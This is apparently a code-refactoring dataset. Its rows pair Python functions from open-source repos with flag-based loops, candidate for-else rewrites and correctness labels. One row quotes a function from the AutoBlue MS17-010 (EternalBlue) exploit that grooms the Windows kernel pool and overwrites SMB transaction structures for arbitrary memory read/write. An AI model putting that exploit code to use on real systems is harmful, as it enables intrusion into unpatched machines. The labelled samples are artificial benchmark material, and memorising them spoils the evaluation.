        subscriber.setsockopt(zmq.SUBSCRIBE, b'')
        poller = zmq.Poller()
        poller.register(subscriber, zmq.POLLIN)
        socks = dict(poller.poll(min(tid / 100.0 + 1, 5) * 60 * 1000))
        if socks and socks.get(subscriber) == zmq.POLLIN:
            hosts = pickle.loads(subscriber.recv(zmq.NOBLOCK))
            line = hosts.get(host)
            if not six.PY2:
                line = line.decode('utf-8')

            if line:
                command = line.split(' ')
            else:
                return reply_status(driver, task.task_id, 'TASK_FAILED')
        else:
            return reply_status(driver, task.task_id, 'TASK_FAILED')

    mem = 100
    for r in task.resources:
        if r.name == 'mem':
            mem = r.scalar.value
            break

    try:
        env = dict(os.environ)
        env.update(_env)
        if not os.path.exists(cwd):
            print('CWD %s is not exists, use /tmp instead' % cwd, file=werr)
            cwd = '/tmp'
        p = subprocess.Popen(command,
                             stdout=wout, stderr=werr,
                             cwd=cwd, env=env, shell=shell)
        tid = task.task_id.value
        self.ps[tid] = p
        code = None
        last_time = 0
        while True:
            time.sleep(0.1)
            code = p.poll()
            if code is not None:
                break

            now = time.time()
            if now < last_time + 2:
                continue

            last_time = now
            try:
                import psutil
                process = psutil.Process(p.pid)

                rss = sum((proc.memory_info().rss
                           for proc in process.get_children(recursive=True)),
                          process.memory_info().rss)
                rss = (rss >> 20)

                if rss > mem * 1.5:
                    print(""task %s used too much memory: %dMB > %dMB * 1.5, kill it. "" \
                          ""use -m argument to request more memory."" % (
                              tid, rss, mem), file=werr)
                    p.kill()

                elif rss > mem:
                    print(""task %s used too much memory: %dMB > %dMB, "" \
                          ""use -m to request for more memory"" % (
                              tid, rss, mem), file=werr)

            except Exception:
                pass

        if code == 0:
            status = 'TASK_FINISHED'
        else:
            print(' '.join(command) + ' exit with %s' % code, file=werr)
            status = 'TASK_FAILED'
    except Exception:
        status = 'TASK_FAILED'
        import traceback
        print('exception while open ' + ' '.join(command), file=werr)
        for line in traceback.format_exc():
            werr.write(line)

    reply_status(driver, task.task_id, status)

    wout.close()
    werr.close()
    t1.join()
    t2.join()

    self.ps.pop(tid, None)
    self.ts.pop(tid, None)","while True:
    time.sleep(0.1)
    code = p.poll()
    if code is not None:
        break
    now = time.time()
    if now < last_time + 2:
        continue
    last_time = now
    try:
        import psutil
        process = psutil.Process(p.pid)
        rss = sum((proc.memory_info().rss for proc in process.get_children(recursive=True)), process.memory_info().rss)
        rss = rss >> 20
        if rss > mem * 1.5:
            print('task %s used too much memory: %dMB > %dMB * 1.5, kill it. use -m argument to request more memory.' % (tid, rss, mem), file=werr)
            p.kill()
        elif rss > mem:
            print('task %s used too much memory: %dMB > %dMB, use -m to request for more memory' % (tid, rss, mem), file=werr)
    except Exception:
        pass
if code == 0:
    status = 'TASK_FINISHED'
else:
    print(' '.join(command) + ' exit with %s' % code, file=werr)
    status = 'TASK_FAILED'","while True:
    time.sleep(0.1)
    code = p.poll()
    if code is not None:
        print(' '.join(command) + ' exit with %s' % code, file=werr)
        status = 'TASK_FAILED'
        break
    now = time.time()
    if now < last_time + 2:
        continue
    last_time = now
    try:
        import psutil
        process = psutil.Process(p.pid)
        rss = sum((proc.memory_info().rss for proc in process.get_children(recursive=True)), process.memory_info().rss)
        rss = rss >> 20
        if rss > mem * 1.5:
            print('task %s used too much memory: %dMB > %dMB * 1.5, kill it. use -m argument to request more memory.' % (tid, rss, mem), file=werr)
            p.kill()
        elif rss > mem:
            print('task %s used too much memory: %dMB > %dMB, use -m to request for more memory' % (tid, rss, mem), file=werr)
    except Exception:
        pass
else:
    status = 'TASK_FINISHED'","while True:
    time.sleep(0.1)
    code = p.poll()
    if code is not None:
        print(' '.join(command) + ' exit with %s' % code, file=werr)
        status = 'TASK_FAILED'
        break
    now = time.time()
    if now < last_time + 2:
        continue
    last_time = now
    try:
        import psutil
        process = psutil.Process(p.pid)
        rss = sum((proc.memory_info().rss for proc in process.get_children(recursive=True)), process.memory_info().rss)
        rss = rss >> 20
        if rss > mem * 1.5:
            print('task %s used too much memory: %dMB > %dMB * 1.5, kill it. use -m argument to request more memory.' % (tid, rss, mem), file=werr)
            p.kill()
        elif rss > mem:
            print('task %s used too much memory: %dMB > %dMB, use -m to request for more memory' % (tid, rss, mem), file=werr)
    except Exception:
        pass
else:
    status = 'TASK_FINISHED'",1,"while True:
    time.sleep(0.1)
    code = p.poll()
    if code is not None:
        break
    now = time.time()
    if now < last_time + 2:
        continue
    last_time = now
    try:
        import psutil
        process = psutil.Process(p.pid)
        rss = sum((proc.memory_info().rss for proc in process.get_children(recursive=True)), process.memory_info().rss)
        rss = rss >> 20
        if rss > mem * 1.5:
            print('task %s used too much memory: %dMB > %dMB * 1.5, kill it. use -m argument to request more memory.' % (tid, rss, mem), file=werr)
            p.kill()
        elif rss > mem:
            print('task %s used too much memory: %dMB > %dMB, use -m to request for more memory' % (tid, rss, mem), file=werr)
    except Exception:
        pass
if code == 0:
    status = 'TASK_FINISHED'
else:
    print(' '.join(command) + ' exit with %s' % code, file=werr)
    status = 'TASK_FAILED'","break statement is executed:None
break statement is not executed:zejun1"
AutoBlue-MS17-010,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/AutoBlue-MS17-010/zzz_exploit.py,https://github.com/3ndG4me/AutoBlue-MS17-010/tree/master//zzz_exploit.py,,exploit_matched_pairs$461,"def exploit_matched_pairs(conn, pipe_name, info):
    # for Windows 7/2008 R2 and later

    tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
    conn.set_default_tid(tid)
    # fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.
    fid = conn.nt_create_andx(tid, pipe_name)

    info.update(leak_frag_size(conn, tid, fid))
    # add os and arch specific exploit info
    info.update(OS_ARCH_INFO[info['os']][info['arch']])

    # groom: srv buffer header
    info['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])
    print('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE']))
    # groom paramters and data is alignment by 8 because it is NT_TRANS
    info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - info['TRANS_SIZE']  # alignment (4)

    # bride: srv buffer header, pool header (same as pool align size), empty transaction name (4)
    bridePoolSize = 0x1000 - (info['GROOM_POOL_SIZE'] & 0xfff) - info['FRAG_POOL_SIZE']
    info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
    print('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE']))
    # bride paramters and data is alignment by 4 because it is TRANS
    info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']

    # ================================
    # try align pagedpool and leak info until satisfy
    # ================================
    leakInfo = None
    # max attempt: 10
    for i in range(10):
        reset_extra_mid(conn)
        leakInfo = align_transaction_and_leak(conn, tid, fid, info)
        if leakInfo is not None:
            break
        print('[-] leak failleak failed... try again')
        conn.close(tid, fid)
        conn.disconnect_tree(tid)

        tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
        conn.set_default_tid(tid)
        fid = conn.nt_create_andx(tid, pipe_name)

    if leakInfo is None:
        return False

    info['fid'] = fid
    info.update(leakInfo)

    # ================================
    # shift transGroom.Indata ptr with SmbWriteAndX
    # ================================
    shift_indata_byte = 0x200
    conn.do_write_andx_raw_pipe(fid, 'A'*shift_indata_byte)

    # Note: Even the distance between bride transaction is exactly what we want, the groom transaction might be in a wrong place.
    #       So the below operation is still dangerous. Write only 1 byte with '\x00' might be safe even alignment is wrong.
    # maxParameterCount (0x1000), trans name (4), param (4)
    indata_value = info['next_page_addr'] + info['TRANS_SIZE'] + 8 + info['SRV_BUFHDR_SIZE'] + 0x1000 + shift_indata_byte
    indata_next_trans_displacement = info['trans2_addr'] - indata_value
    conn.send_nt_trans_secondary(mid=fid, data=b'\x00', dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])
    wait_for_request_processed(conn)

    # if the overwritten is correct, a modified transaction mid should be special_mid now.
    # a new transaction with special_mid should be error.
    recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack('<HH', fid, 0), data='')
    if recvPkt.getNTStatus() != 0x10002:  # invalid SMB
        print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
        print('!!! Write to wrong place !!!')
        print('the target might be crashed')
        return False

    print('[+] success controlling groom transaction')

    # NSA exploit set refCnt on leaked transaction to very large number for reading data repeatly
    # but this method make the transation never get freed
    # I will avoid memory leak

    # ================================
    # modify trans1 struct to be used for arbitrary read/write
    # ================================
    print('[*] modify trans1 struct for arbitrary read/write')
    fmt = info['PTR_FMT']
    # use transGroom to modify trans2.InData to &trans1. so we can modify trans1 with trans2 data
    conn.send_nt_trans_secondary(mid=fid, data=pack('<'+fmt, info['trans1_addr']), dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
    wait_for_request_processed(conn)

    # modify
    # - trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)
    # - trans1.InData to &trans2. so we can modify trans2 with trans1 data
    conn.send_nt_trans_secondary(mid=special_mid, data=pack('<'+fmt*3, info['trans1_addr'], info['trans1_addr']+0x200, info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])
    wait_for_request_processed(conn)

    # modify trans2.mid
    info['trans2_mid'] = conn.next_mid()
    conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
    return True","for i in range(10):
    reset_extra_mid(conn)
    leakInfo = align_transaction_and_leak(conn, tid, fid, info)
    if leakInfo is not None:
        break
    print('[-] leak failleak failed... try again')
    conn.close(tid, fid)
    conn.disconnect_tree(tid)
    tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
    conn.set_default_tid(tid)
    fid = conn.nt_create_andx(tid, pipe_name)
if leakInfo is None:
    return False","for i in range(10):
    reset_extra_mid(conn)
    leakInfo = align_transaction_and_leak(conn, tid, fid, info)
    if leakInfo is not None:
        break
    print('[-] leak failleak failed... try again')
    conn.close(tid, fid)
    conn.disconnect_tree(tid)
    tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
    conn.set_default_tid(tid)
    fid = conn.nt_create_andx(tid, pipe_name)
else:
    return False","for i in range(10):
    reset_extra_mid(conn)
    leakInfo = align_transaction_and_leak(conn, tid, fid, info)
    if leakInfo is not None:
        break
    print('[-] leak failleak failed... try again')
    conn.close(tid, fid)
    conn.disconnect_tree(tid)
    tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
    conn.set_default_tid(tid)
    fid = conn.nt_create_andx(tid, pipe_name)
else:
    return False",1,"for i in range(10):
    reset_extra_mid(conn)
    leakInfo = align_transaction_and_leak(conn, tid, fid, info)
    if leakInfo is not None:
        break
    print('[-] leak failleak failed... try again')
    conn.close(tid, fid)
    conn.disconnect_tree(tid)
    tid = conn.tree_connect_andx('\\\\' + conn.get_remote_host() + '\\' + 'IPC$')
    conn.set_default_tid(tid)
    fid = conn.nt_create_andx(tid, pipe_name)
if leakInfo is None:
    return False","break statement is executed:None
break statement is not executed:zejun1"
ArknightsAutoHelper,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ArknightsAutoHelper/imgreco/inventory.py,https://github.com/ninthDevilHAUNSTER/ArknightsAutoHelper/tree/master/imgreco/inventory.py,,group_pos$27,"def group_pos(ys):
    tmp = {}
    for y in ys:
        flag = True
        for k, v in tmp.items():
            if abs(y - k) < 20:
                v.append(y)
                flag = False
                break
        if flag:
            tmp[y] = [y]
    res = [sum(v) // len(v) for v in tmp.values()]
    res.sort()
    return res","for (k, v) in tmp.items():
    if abs(y - k) < 20:
        v.append(y)
        flag = False
        break
if flag:
    tmp[y] = [y]","for (k, v) in tmp.items():
    if abs(y - k) < 20:
        v.append(y)
        break
else:
    tmp[y] = [y]","for (k, v) in tmp.items():
    if abs(y - k) < 20:
        v.append(y)
        break
else:
    tmp[y] = [y]",1,"for (k, v) in tmp.items():
    if abs(y - k) < 20:
        v.append(y)
        flag = False
        break
if flag:
    tmp[y] = [y]","break statement is executed:None
break statement is not executed:zejun1"
brat,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/brat/server/src/search.py,https://github.com/nlplab/brat/tree/master/server/src/search.py,,search_anns_for_relation$811,"def search_anns_for_relation(ann_objs, arg1, arg1type, arg2, arg2type,
                             restrict_types=None, ignore_types=None,
                             text_match=""word"", match_case=False):
    """"""Searches the given Annotations objects for relation annotations matching
    the given specification.

    Returns a SearchMatchSet object.
    """"""

    global REPORT_SEARCH_TIMINGS
    if REPORT_SEARCH_TIMINGS:
        process_start = datetime.now()

    # treat None and empty list uniformly
    restrict_types = [] if restrict_types is None else restrict_types
    ignore_types = [] if ignore_types is None else ignore_types

    # TODO: include args in description
    description = ""Relations""
    if restrict_types != []:
        description = description + \
            ' (of type %s)' % ("","".join(restrict_types))
    matches = SearchMatchSet(description)

    # compile regular expressions according to arguments for matching
    arg1_match_regex, arg2_match_regex = None, None
    if arg1 is not None:
        arg1_match_regex = _get_match_regex(arg1, text_match, match_case)
    if arg2 is not None:
        arg2_match_regex = _get_match_regex(arg2, text_match, match_case)

    if ((arg1 is not None and arg1_match_regex is None) or
            (arg2 is not None and arg2_match_regex is None)):
        # something went wrong, return empty
        return matches

    for ann_obj in ann_objs:
        # collect per-document (ann_obj) for sorting
        ann_matches = []

        # binary relations and equivs need to be treated separately due
        # to different structure (not a great design there)
        for r in ann_obj.get_relations():
            if r.type in ignore_types:
                continue
            if restrict_types != [] and r.type not in restrict_types:
                continue

            # argument constraints
            if arg1 is not None or arg1type is not None:
                arg1ent = ann_obj.get_ann_by_id(r.arg1)
                if arg1 is not None and not arg1_match_regex.search(
                        arg1ent.get_text()):
                    continue
                if arg1type is not None and arg1type != arg1ent.type:
                    continue
            if arg2 is not None or arg2type is not None:
                arg2ent = ann_obj.get_ann_by_id(r.arg2)
                if arg2 is not None and not arg2_match_regex.search(
                        arg2ent.get_text()):
                    continue
                if arg2type is not None and arg2type != arg2ent.type:
                    continue

            ann_matches.append(r)

        for r in ann_obj.get_equivs():
            if r.type in ignore_types:
                continue
            if restrict_types != [] and r.type not in restrict_types:
                continue

            # argument constraints. This differs from that for non-equiv
            # for relations as equivs are symmetric, so the arg1-arg2
            # distinction can be ignored.

            # TODO: this can match the same thing twice, which most
            # likely isn't what a user expects: for example, having
            # 'Protein' for both arg1type and arg2type can still match
            # an equiv between 'Protein' and 'Gene'.
            match_found = False
            for arg, argtype, arg_match_regex in (
                    (arg1, arg1type, arg1_match_regex), (arg2, arg2type, arg2_match_regex)):
                match_found = False
                for aeid in r.entities:
                    argent = ann_obj.get_ann_by_id(aeid)
                    if arg is not None and not arg_match_regex.search(
                            argent.get_text()):
                        continue
                    if argtype is not None and argtype != argent.type:
                        continue
                    match_found = True
                    break
                if not match_found:
                    break
            if not match_found:
                continue

            ann_matches.append(r)

        # TODO: sort, e.g. by offset of participant occurring first
        # ann_matches.sort(lambda a,b: cmp(???))

        # add to overall collection
        for r in ann_matches:
            matches.add_match(ann_obj, r)

        # MAX_SEARCH_RESULT_NUMBER <= 0 --> no limit
        if len(matches) > MAX_SEARCH_RESULT_NUMBER and MAX_SEARCH_RESULT_NUMBER > 0:
            Messager.warning(
                'Search result limit (%d) exceeded, stopping search.' %
                MAX_SEARCH_RESULT_NUMBER)
            break

    matches.limit_to(MAX_SEARCH_RESULT_NUMBER)

    # sort by document name for output
    matches.sort_matches()

    if REPORT_SEARCH_TIMINGS:
        process_delta = datetime.now() - process_start
        print(""search_anns_for_relation: processed in"", str(
            process_delta.seconds) + ""."" + str(process_delta.microseconds / 10000), ""seconds"", file=stderr)

    return matches","for (arg, argtype, arg_match_regex) in ((arg1, arg1type, arg1_match_regex), (arg2, arg2type, arg2_match_regex)):
    match_found = False
    for aeid in r.entities:
        argent = ann_obj.get_ann_by_id(aeid)
        if arg is not None and (not arg_match_regex.search(argent.get_text())):
            continue
        if argtype is not None and argtype != argent.type:
            continue
        match_found = True
        break
    if not match_found:
        break
if not match_found:
    continue","for (arg, argtype, arg_match_regex) in ((arg1, arg1type, arg1_match_regex), (arg2, arg2type, arg2_match_regex)):
    match_found = False
    for aeid in r.entities:
        argent = ann_obj.get_ann_by_id(aeid)
        if arg is not None and (not arg_match_regex.search(argent.get_text())):
            continue
        if argtype is not None and argtype != argent.type:
            continue
        match_found = True
        break
    if not match_found:
        break
else:
    continue",Cannot refactor,-1,"for (arg, argtype, arg_match_regex) in ((arg1, arg1type, arg1_match_regex), (arg2, arg2type, arg2_match_regex)):
    match_found = False
    for aeid in r.entities:
        argent = ann_obj.get_ann_by_id(aeid)
        if arg is not None and (not arg_match_regex.search(argent.get_text())):
            continue
        if argtype is not None and argtype != argent.type:
            continue
        match_found = True
        break
    if not match_found:
        break
if not match_found:
    continue","break statement is executed:None
break statement is not executed:zejun1"
brat,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/brat/server/src/search.py,https://github.com/nlplab/brat/tree/master/server/src/search.py,,search_anns_for_relation$811,"def search_anns_for_relation(ann_objs, arg1, arg1type, arg2, arg2type,
                             restrict_types=None, ignore_types=None,
                             text_match=""word"", match_case=False):
    """"""Searches the given Annotations objects for relation annotations matching
    the given specification.

    Returns a SearchMatchSet object.
    """"""

    global REPORT_SEARCH_TIMINGS
    if REPORT_SEARCH_TIMINGS:
        process_start = datetime.now()

    # treat None and empty list uniformly
    restrict_types = [] if restrict_types is None else restrict_types
    ignore_types = [] if ignore_types is None else ignore_types

    # TODO: include args in description
    description = ""Relations""
    if restrict_types != []:
        description = description + \
            ' (of type %s)' % ("","".join(restrict_types))
    matches = SearchMatchSet(description)

    # compile regular expressions according to arguments for matching
    arg1_match_regex, arg2_match_regex = None, None
    if arg1 is not None:
        arg1_match_regex = _get_match_regex(arg1, text_match, match_case)
    if arg2 is not None:
        arg2_match_regex = _get_match_regex(arg2, text_match, match_case)

    if ((arg1 is not None and arg1_match_regex is None) or
            (arg2 is not None and arg2_match_regex is None)):
        # something went wrong, return empty
        return matches

    for ann_obj in ann_objs:
        # collect per-document (ann_obj) for sorting
        ann_matches = []

        # binary relations and equivs need to be treated separately due
        # to different structure (not a great design there)
        for r in ann_obj.get_relations():
            if r.type in ignore_types:
                continue
            if restrict_types != [] and r.type not in restrict_types:
                continue

            # argument constraints
            if arg1 is not None or arg1type is not None:
                arg1ent = ann_obj.get_ann_by_id(r.arg1)
                if arg1 is not None and not arg1_match_regex.search(
                        arg1ent.get_text()):
                    continue
                if arg1type is not None and arg1type != arg1ent.type:
                    continue
            if arg2 is not None or arg2type is not None:
                arg2ent = ann_obj.get_ann_by_id(r.arg2)
                if arg2 is not None and not arg2_match_regex.search(
                        arg2ent.get_text()):
                    continue
                if arg2type is not None and arg2type != arg2ent.type:
                    continue

            ann_matches.append(r)

        for r in ann_obj.get_equivs():
            if r.type in ignore_types:
                continue
            if restrict_types != [] and r.type not in restrict_types:
                continue

            # argument constraints. This differs from that for non-equiv
            # for relations as equivs are symmetric, so the arg1-arg2
            # distinction can be ignored.

            # TODO: this can match the same thing twice, which most
            # likely isn't what a user expects: for example, having
            # 'Protein' for both arg1type and arg2type can still match
            # an equiv between 'Protein' and 'Gene'.
            match_found = False
            for arg, argtype, arg_match_regex in (
                    (arg1, arg1type, arg1_match_regex), (arg2, arg2type, arg2_match_regex)):
                match_found = False
                for aeid in r.entities:
                    argent = ann_obj.get_ann_by_id(aeid)
                    if arg is not None and not arg_match_regex.search(
                            argent.get_text()):
                        continue
                    if argtype is not None and argtype != argent.type:
                        continue
                    match_found = True
                    break
                if not match_found:
                    break
            if not match_found:
                continue

            ann_matches.append(r)

        # TODO: sort, e.g. by offset of participant occurring first
        # ann_matches.sort(lambda a,b: cmp(???))

        # add to overall collection
        for r in ann_matches:
            matches.add_match(ann_obj, r)

        # MAX_SEARCH_RESULT_NUMBER <= 0 --> no limit
        if len(matches) > MAX_SEARCH_RESULT_NUMBER and MAX_SEARCH_RESULT_NUMBER > 0:
            Messager.warning(
                'Search result limit (%d) exceeded, stopping search.' %
                MAX_SEARCH_RESULT_NUMBER)
            break

    matches.limit_to(MAX_SEARCH_RESULT_NUMBER)

    # sort by document name for output
    matches.sort_matches()

    if REPORT_SEARCH_TIMINGS:
        process_delta = datetime.now() - process_start
        print(""search_anns_for_relation: processed in"", str(
            process_delta.seconds) + ""."" + str(process_delta.microseconds / 10000), ""seconds"", file=stderr)

    return matches","for aeid in r.entities:
    argent = ann_obj.get_ann_by_id(aeid)
    if arg is not None and (not arg_match_regex.search(argent.get_text())):
        continue
    if argtype is not None and argtype != argent.type:
        continue
    match_found = True
    break
if not match_found:
    break","for aeid in r.entities:
    argent = ann_obj.get_ann_by_id(aeid)
    if arg is not None and (not arg_match_regex.search(argent.get_text())):
        continue
    if argtype is not None and argtype != argent.type:
        continue
    match_found = True
    break
else:
    break","for aeid in r.entities:
    argent = ann_obj.get_ann_by_id(aeid)
    if arg is not None and (not arg_match_regex.search(argent.get_text())):
        continue
    if argtype is not None and argtype != argent.type:
        continue
    break
else:
    break",0,"for aeid in r.entities:
    argent = ann_obj.get_ann_by_id(aeid)
    if arg is not None and (not arg_match_regex.search(argent.get_text())):
        continue
    if argtype is not None and argtype != argent.type:
        continue
    match_found = True
    break
if not match_found:
    break","break statement is executed:None
break statement is not executed:zejun1"
ansible-modules-extras,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ansible-modules-extras/cloud/profitbricks/profitbricks_nic.py,https://github.com/ansible/ansible-modules-extras/tree/master/cloud/profitbricks/profitbricks_nic.py,,delete_nic$180,"def delete_nic(module, profitbricks):
    """"""
    Removes a NIC

    module : AnsibleModule object
    profitbricks: authenticated profitbricks object.

    Returns:
        True if the NIC was removed, false otherwise
    """"""
    datacenter = module.params.get('datacenter')
    server = module.params.get('server')
    name = module.params.get('name')

    # Locate UUID for Datacenter
    if not (uuid_match.match(datacenter)):
        datacenter_list = profitbricks.list_datacenters()
        for d in datacenter_list['items']:
            dc = profitbricks.get_datacenter(d['id'])
            if datacenter == dc['properties']['name']:
                datacenter = d['id']
                break

    # Locate UUID for Server
    server_found = False
    if not (uuid_match.match(server)):
        server_list = profitbricks.list_servers(datacenter)
        for s in server_list['items']:
            if server == s['properties']['name']:
                server_found = True
                server = s['id']
                break

        if not server_found:
            return False

    # Locate UUID for NIC
    nic_found = False
    if not (uuid_match.match(name)):
        nic_list = profitbricks.list_nics(datacenter, server)
        for n in nic_list['items']:
            if name == n['properties']['name']:
                nic_found = True
                name = n['id']
                break

        if not nic_found:
            return False

    try:
        nic_response = profitbricks.delete_nic(datacenter, server, name)
        return nic_response
    except Exception as e:
        module.fail_json(msg=""failed to remove the NIC: %s"" % str(e))","for s in server_list['items']:
    if server == s['properties']['name']:
        server_found = True
        server = s['id']
        break
if not server_found:
    return False","for s in server_list['items']:
    if server == s['properties']['name']:
        server = s['id']
        break
else:
    return False","for s in server_list['items']:
    if server == s['properties']['name']:
        server = s['id']
        break
else:
    return False",1,"for s in server_list['items']:
    if server == s['properties']['name']:
        server_found = True
        server = s['id']
        break
if not server_found:
    return False","break statement is executed:None
break statement is not executed:zejun1"
ansible-modules-extras,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ansible-modules-extras/cloud/profitbricks/profitbricks_nic.py,https://github.com/ansible/ansible-modules-extras/tree/master/cloud/profitbricks/profitbricks_nic.py,,delete_nic$180,"def delete_nic(module, profitbricks):
    """"""
    Removes a NIC

    module : AnsibleModule object
    profitbricks: authenticated profitbricks object.

    Returns:
        True if the NIC was removed, false otherwise
    """"""
    datacenter = module.params.get('datacenter')
    server = module.params.get('server')
    name = module.params.get('name')

    # Locate UUID for Datacenter
    if not (uuid_match.match(datacenter)):
        datacenter_list = profitbricks.list_datacenters()
        for d in datacenter_list['items']:
            dc = profitbricks.get_datacenter(d['id'])
            if datacenter == dc['properties']['name']:
                datacenter = d['id']
                break

    # Locate UUID for Server
    server_found = False
    if not (uuid_match.match(server)):
        server_list = profitbricks.list_servers(datacenter)
        for s in server_list['items']:
            if server == s['properties']['name']:
                server_found = True
                server = s['id']
                break

        if not server_found:
            return False

    # Locate UUID for NIC
    nic_found = False
    if not (uuid_match.match(name)):
        nic_list = profitbricks.list_nics(datacenter, server)
        for n in nic_list['items']:
            if name == n['properties']['name']:
                nic_found = True
                name = n['id']
                break

        if not nic_found:
            return False

    try:
        nic_response = profitbricks.delete_nic(datacenter, server, name)
        return nic_response
    except Exception as e:
        module.fail_json(msg=""failed to remove the NIC: %s"" % str(e))","for n in nic_list['items']:
    if name == n['properties']['name']:
        nic_found = True
        name = n['id']
        break
if not nic_found:
    return False","for n in nic_list['items']:
    if name == n['properties']['name']:
        name = n['id']
        break
else:
    return False","for n in nic_list['items']:
    if name == n['properties']['name']:
        name = n['id']
        break
else:
    return False",1,"for n in nic_list['items']:
    if name == n['properties']['name']:
        nic_found = True
        name = n['id']
        break
if not nic_found:
    return False","break statement is executed:None
break statement is not executed:zejun1"
Paddle,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Paddle/tools/codestyle/docstring_checker.py,https://github.com/PaddlePaddle/Paddle/tree/master/tools/codestyle/docstring_checker.py,DocstringChecker,with_returns$299,"def with_returns(self, node, doc):
        """"""with_returns checks if docstring comments what are returned .
        Args:
            node (astroid.node): the node is visiting.
            doc (Docstring): Docstring object.
        Returns:
            True if successful otherwise False.
        """"""

        if node.name.startswith(""__"") or node.name.startswith(""_""):
            return True
        find = False
        for t in node.body:
            if not isinstance(t, astroid.Return):
                continue

            find = True
            break

        if not find:
            return True

        if len(doc.get_returns()) == 0:
            self.add_message('W9007', node=node, line=node.fromlineno)
            return False

        return True","for t in node.body:
    if not isinstance(t, astroid.Return):
        continue
    find = True
    break
if not find:
    return True","for t in node.body:
    if not isinstance(t, astroid.Return):
        continue
    break
else:
    return True","for t in node.body:
    if not isinstance(t, astroid.Return):
        continue
    break
else:
    return True",1,"for t in node.body:
    if not isinstance(t, astroid.Return):
        continue
    find = True
    break
if not find:
    return True","break statement is executed:None
break statement is not executed:zejun1"
R-Drop,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/R-Drop/huggingface_transformer_src/src/transformers/models/bert/tokenization_bert.py,https://github.com/dropreg/R-Drop/tree/master/huggingface_transformer_src/src/transformers/models/bert/tokenization_bert.py,WordpieceTokenizer,tokenize$509,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, :obj:`input = ""unaffable""` wil return as output :obj:`[""un"", ""##aff"", ""##able""]`.

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer`.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
R-Drop,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/R-Drop/huggingface_transformer_src/src/transformers/models/bert/tokenization_bert.py,https://github.com/dropreg/R-Drop/tree/master/huggingface_transformer_src/src/transformers/models/bert/tokenization_bert.py,WordpieceTokenizer,tokenize$509,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

